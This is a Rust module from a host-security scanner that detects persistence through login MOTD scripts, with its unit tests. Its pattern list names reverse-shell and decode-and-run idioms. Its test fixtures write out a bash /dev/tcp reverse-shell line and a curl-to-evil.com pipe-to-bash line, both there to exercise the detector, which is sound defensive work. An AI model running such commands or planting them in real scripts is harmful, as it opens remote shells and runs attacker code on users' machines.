//! MOTD persistence detection
//!
//! Scans `/etc/update-motd.d/` for executable scripts that run on login,
//! checking for backdoor patterns and non-standard scripts that could
//! provide persistence via the Message of the Day mechanism.

use crate::checks::IotCheck;
use protectinator_container::filesystem::ContainerFs;
use protectinator_core::{Finding, FindingSource, Severity};
use std::os::unix::fs::PermissionsExt;
use tracing::debug;

/// Standard MOTD scripts shipped by common packages
const STANDARD_MOTD_SCRIPTS: &[&str] = &[
    "00-header",
    "10-help-text",
    "10-uname",
    "50-motd-news",
    "50-landscape-sysinfo",
    "60-unminimize",
    "80-esm",
    "80-livepatch",
    "85-fwupd",
    "90-updates-available",
    "91-release-upgrade",
    "92-unattended-upgrades",
    "95-hwe-eol",
    "97-overlayroot",
    "98-fsck-at-reboot",
    "98-reboot-required",
];

/// Dangerous patterns that always flag as High regardless of script origin
const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    ("bash -i", "interactive bash — potential reverse shell"),
    ("/dev/tcp/", "bash network redirection — potential reverse shell"),
    ("nc -e", "netcat with exec — reverse shell"),
    ("ncat -e", "ncat with exec — reverse shell"),
    ("chmod +s", "adding SUID bit"),
    ("/dev/shm/", "execution from shared memory"),
    ("base64 -d | sh", "decoded shell execution"),
    ("base64 -d | bash", "decoded shell execution"),
    ("python -c", "inline Python execution"),
    ("python3 -c", "inline Python execution"),
];

/// Mild patterns that flag as Medium only for non-standard scripts
const MILD_PATTERNS: &[(&str, &str)] = &[
    ("curl", "downloads from internet (curl)"),
    ("wget", "downloads from internet (wget)"),
    ("eval", "dynamic code execution"),
    ("base64", "base64 encoding/decoding"),
];

/// Pattern for "curl|sh" or "wget|sh" style pipe-to-shell
const PIPE_TO_SHELL_PATTERNS: &[&str] = &[
    "curl",  // checked in combination with pipe-to-shell below
    "wget",
];

fn make_source(location: &str) -> FindingSource {
    FindingSource::Persistence {
        persistence_type: "motd_script".to_string(),
        location: location.to_string(),
    }
}

/// MOTD persistence check
pub struct MotdPersistenceCheck;

impl IotCheck for MotdPersistenceCheck {
    fn id(&self) -> &str {
        "iot-motd-persistence"
    }

    fn name(&self) -> &str {
        "MOTD Persistence Check"
    }

    fn run(&self, fs: &ContainerFs) -> Vec<Finding> {
        let mut findings = Vec::new();

        check_update_motd_d(fs, &mut findings);
        check_etc_motd(fs, &mut findings);

        findings
    }
}

/// Scan /etc/update-motd.d/ for suspicious or non-standard scripts
fn check_update_motd_d(fs: &ContainerFs, findings: &mut Vec<Finding>) {
    let motd_dir = "/etc/update-motd.d";
    let entries = match fs.read_dir(motd_dir) {
        Ok(e) => e,
        Err(_) => {
            debug!("Cannot read /etc/update-motd.d, skipping MOTD check");
            return;
        }
    };

    for entry in entries.flatten() {
        let name = entry.file_name();
        let name_str = name.to_string_lossy().to_string();
        let file_path = format!("{}/{}", motd_dir, name_str);

        // Check if executable
        let is_executable = match fs.metadata(&file_path) {
            Ok(meta) => meta.permissions().mode() & 0o111 != 0,
            Err(_) => false,
        };

        if !is_executable {
            continue;
        }

        let is_standard = STANDARD_MOTD_SCRIPTS.contains(&name_str.as_str());

        // Read content for pattern analysis
        let content = match fs.read_to_string(&file_path) {
            Ok(c) => c,
            Err(_) => {
                // Can't read — if non-standard, still flag as Low
                if !is_standard {
                    findings.push(
                        Finding::new(
                            "iot-motd-persistence",
                            format!("Non-standard MOTD script: {}", name_str),
                            format!(
                                "Executable script '{}' in /etc/update-motd.d/ is not a standard \
                                 MOTD script. Unable to read contents for analysis.",
                                name_str
                            ),
                            Severity::Low,
                            make_source(&file_path),
                        )
                        .with_resource(file_path),
                    );
                }
                continue;
            }
        };

        // Check for dangerous patterns
        let dangerous: Vec<String> = assess_dangerous_patterns(&content);

        // Check for pipe-to-shell patterns specifically
        let has_pipe_to_shell = check_pipe_to_shell(&content);

        // Check for mild patterns
        let mild: Vec<String> = assess_mild_patterns(&content);

        if !dangerous.is_empty() || has_pipe_to_shell {
            let mut all_reasons = dangerous.clone();
            if has_pipe_to_shell {
                all_reasons.push("pipe-to-shell pattern (download piped to sh/bash)".to_string());
            }
            all_reasons.extend(mild.clone());

            findings.push(
                Finding::new(
                    "iot-motd-persistence",
                    format!("Dangerous MOTD script: {}", name_str),
                    format!(
                        "MOTD script '{}' contains dangerous patterns: {}. \
                         MOTD scripts execute on every login and can be used for \
                         persistence, credential harvesting, or reverse shell access.",
                        name_str,
                        all_reasons.join(", ")
                    ),
                    Severity::High,
                    make_source(&file_path),
                )
                .with_resource(file_path.clone())
                .with_remediation(
                    "Remove this script from /etc/update-motd.d/ and investigate for \
                     further compromise. Check login logs for evidence of execution.",
                )
                .with_reference("https://attack.mitre.org/techniques/T1546/"),
            );
        } else if !is_standard && !mild.is_empty() {
            findings.push(
                Finding::new(
                    "iot-motd-persistence",
                    format!("MOTD script with notable patterns: {}", name_str),
                    format!(
                        "Non-standard MOTD script '{}' contains patterns of interest: {}. \
                         Review to ensure this script is legitimate.",
                        name_str,
                        mild.join(", ")
                    ),
                    Severity::Medium,
                    make_source(&file_path),
                )
                .with_resource(file_path.clone())
                .with_remediation(
                    "Verify this MOTD script is expected and its commands are safe.",
                ),
            );
        } else if !is_standard {
            findings.push(
                Finding::new(
                    "iot-motd-persistence",
                    format!("Non-standard MOTD script: {}", name_str),
                    format!(
                        "Executable script '{}' in /etc/update-motd.d/ is not a recognized \
                         standard MOTD script. Content appears clean but should be reviewed.",
                        name_str
                    ),
                    Severity::Low,
                    make_source(&file_path),
                )
                .with_resource(file_path.clone())
                .with_remediation(
                    "Verify this MOTD script was intentionally installed. \
                     Remove if not needed.",
                ),
            );
        }
    }
}

/// Check /etc/motd for unusual content
fn check_etc_motd(fs: &ContainerFs, findings: &mut Vec<Finding>) {
    let motd_path = "/etc/motd";
    let content = match fs.read_to_string(motd_path) {
        Ok(c) => c,
        Err(_) => return,
    };

    if content.is_empty() {
        return;
    }

    // Check for very long MOTD (could hide content)
    let line_count = content.lines().count();
    let has_shell_syntax = content.contains("$(")
        || content.contains("`")
        || content.contains("#!/")
        || content.contains("eval ")
        || content.contains("exec ");

    if has_shell_syntax {
        findings.push(
            Finding::new(
                "iot-motd-persistence",
                "Shell syntax in /etc/motd",
                "The /etc/motd file contains shell syntax characters ($(, `, #!, eval, exec). \
                 While /etc/motd is typically displayed as plain text, its contents should be \
                 reviewed for anything unexpected.",
                Severity::Low,
                make_source(motd_path),
            )
            .with_resource(motd_path.to_string())
            .with_remediation(
                "Review /etc/motd contents and remove any unexpected shell commands.",
            ),
        );
    } else if line_count > 50 {
        findings.push(
            Finding::new(
                "iot-motd-persistence",
                "Unusually long /etc/motd",
                format!(
                    "/etc/motd is {} lines long, which is unusually long. \
                     Large MOTD files could be used to hide suspicious content.",
                    line_count
                ),
                Severity::Low,
                make_source(motd_path),
            )
            .with_resource(motd_path.to_string()),
        );
    }
}

/// Check content for dangerous patterns, returning list of matched descriptions
fn assess_dangerous_patterns(content: &str) -> Vec<String> {
    let mut found = Vec::new();
    for (pattern, description) in DANGEROUS_PATTERNS {
        if content.contains(pattern) {
            found.push(description.to_string());
        }
    }
    found
}

/// Check for "curl|sh" or "wget|sh" pipe-to-shell patterns
fn check_pipe_to_shell(content: &str) -> bool {
    for line in content.lines() {
        let line = line.trim();
        if line.starts_with('#') {
            continue;
        }
        for tool in PIPE_TO_SHELL_PATTERNS {
            if line.contains(tool) && line.contains('|') {
                // Check if something after the pipe looks like shell execution
                if let Some(pipe_pos) = line.rfind('|') {
                    let after_pipe = line[pipe_pos + 1..].trim();
                    if after_pipe.starts_with("sh")
                        || after_pipe.starts_with("bash")
                        || after_pipe.starts_with("/bin/sh")
                        || after_pipe.starts_with("/bin/bash")
                    {
                        return true;
                    }
                }
            }
        }
    }
    false
}

/// Check content for mild patterns, returning list of matched descriptions
fn assess_mild_patterns(content: &str) -> Vec<String> {
    let mut found = Vec::new();
    for (pattern, description) in MILD_PATTERNS {
        if content.contains(pattern) {
            found.push(description.to_string());
        }
    }
    found
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    use tempfile::TempDir;

    fn setup_container(tmp: &TempDir) -> ContainerFs {
        ContainerFs::new(tmp.path())
    }

    fn make_executable(path: &std::path::Path) {
        let perms = std::fs::Permissions::from_mode(0o755);
        std::fs::set_permissions(path, perms).unwrap();
    }

    #[test]
    fn test_detects_dangerous_motd_script() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let motd_dir = root.join("etc/update-motd.d");
        fs::create_dir_all(&motd_dir).unwrap();

        let script_path = motd_dir.join("99-backdoor");
        fs::write(
            &script_path,
            "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
        )
        .unwrap();
        make_executable(&script_path);

        let cfs = setup_container(&tmp);
        let check = MotdPersistenceCheck;
        let findings = check.run(&cfs);

        let dangerous: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("Dangerous MOTD"))
            .collect();
        assert_eq!(dangerous.len(), 1);
        assert_eq!(dangerous[0].severity, Severity::High);
        assert!(dangerous[0].description.contains("reverse shell"));
    }

    #[test]
    fn test_non_standard_clean_script_is_low() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let motd_dir = root.join("etc/update-motd.d");
        fs::create_dir_all(&motd_dir).unwrap();

        let script_path = motd_dir.join("99-custom-banner");
        fs::write(&script_path, "#!/bin/bash\necho 'Welcome!'\n").unwrap();
        make_executable(&script_path);

        let cfs = setup_container(&tmp);
        let check = MotdPersistenceCheck;
        let findings = check.run(&cfs);

        let custom: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("Non-standard MOTD"))
            .collect();
        assert_eq!(custom.len(), 1);
        assert_eq!(custom[0].severity, Severity::Low);
    }

    #[test]
    fn test_standard_script_not_flagged() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let motd_dir = root.join("etc/update-motd.d");
        fs::create_dir_all(&motd_dir).unwrap();

        let script_path = motd_dir.join("00-header");
        fs::write(
            &script_path,
            "#!/bin/sh\nprintf 'Welcome to %s\\n' \"$(uname -n)\"\n",
        )
        .unwrap();
        make_executable(&script_path);

        let cfs = setup_container(&tmp);
        let check = MotdPersistenceCheck;
        let findings = check.run(&cfs);

        assert!(
            findings.is_empty(),
            "Standard MOTD scripts should not produce findings, got: {:?}",
            findings.iter().map(|f| &f.title).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_non_standard_with_mild_patterns_is_medium() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let motd_dir = root.join("etc/update-motd.d");
        fs::create_dir_all(&motd_dir).unwrap();

        let script_path = motd_dir.join("99-update-check");
        fs::write(
            &script_path,
            "#!/bin/bash\ncurl -s https://example.com/version\n",
        )
        .unwrap();
        make_executable(&script_path);

        let cfs = setup_container(&tmp);
        let check = MotdPersistenceCheck;
        let findings = check.run(&cfs);

        let medium: Vec<_> = findings
            .iter()
            .filter(|f| f.severity == Severity::Medium)
            .collect();
        assert_eq!(medium.len(), 1);
        assert!(medium[0].title.contains("notable patterns"));
    }

    #[test]
    fn test_shell_syntax_in_etc_motd() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let etc_dir = root.join("etc");
        fs::create_dir_all(&etc_dir).unwrap();

        fs::write(
            etc_dir.join("motd"),
            "Welcome!\n$(whoami) logged in\n",
        )
        .unwrap();

        let cfs = setup_container(&tmp);
        let check = MotdPersistenceCheck;
        let findings = check.run(&cfs);

        let motd_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("Shell syntax"))
            .collect();
        assert_eq!(motd_findings.len(), 1);
        assert_eq!(motd_findings[0].severity, Severity::Low);
    }

    #[test]
    fn test_pipe_to_shell_detected() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let motd_dir = root.join("etc/update-motd.d");
        fs::create_dir_all(&motd_dir).unwrap();

        let script_path = motd_dir.join("99-install");
        fs::write(
            &script_path,
            "#!/bin/bash\ncurl -s http://evil.com/payload | bash\n",
        )
        .unwrap();
        make_executable(&script_path);

        let cfs = setup_container(&tmp);
        let check = MotdPersistenceCheck;
        let findings = check.run(&cfs);

        let dangerous: Vec<_> = findings
            .iter()
            .filter(|f| f.severity == Severity::High)
            .collect();
        assert!(!dangerous.is_empty(), "pipe-to-shell should be flagged as High");
    }
}
